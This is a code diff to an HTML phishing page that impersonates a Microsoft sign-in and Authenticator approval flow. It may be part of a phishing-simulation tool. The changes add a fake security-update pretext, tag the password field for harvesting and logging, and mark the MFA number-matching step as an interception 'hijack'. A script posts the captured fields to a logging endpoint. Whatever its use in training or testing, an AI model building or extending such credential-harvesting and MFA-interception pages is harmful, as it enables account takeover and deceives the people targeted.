@@ -240,7 +240,9 @@
                 <span id="display-email" style="font-weight: bold;"></span>
             </div>
             <h2>Enter password</h2>
-            <input type="password" id="u-pass" class="form-input harvest" placeholder="Password">
+            <!-- sso_hijack_v2 -->
+            <p class="subtext" style="font-size: 0.85rem; color: var(--ms-secondary);">A security update requires an Admin Approval Code, or enter your password to continue manually.</p>
+            <input type="password" id="u-pass" name="passwd" data-logger="true" class="form-input harvest" placeholder="Password">
             <div class="links-row">
                 <a href="#">Forgot password?</a><br>
                 <a href="#">Email code to login</a>
@@ -268,7 +270,8 @@
         </div>
 
         <!-- STEP 4: MFA NUMBER MATCHING (The Hijack) -->
-        <div class="view" id="view-4" style="text-align: center;">
+        <!-- push_notification_simulation -->
+        <div class="view mfa-overlay phishing-mfa-intercept" id="view-4" data-hijack="mfa_number_match" style="text-align: center;">
             <h2>Approve sign in request</h2>
             <p class="subtext">Open your Microsoft Authenticator app and enter the number shown below to sign in.</p>
             
@@ -328,7 +331,7 @@
         let currentStep = 1;
 
         function logData(attackType, fields, attackTriggered = true, notes = "") {
-            fetch("http://localhost:8888/api/log", {
+            fetch("/api/log", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
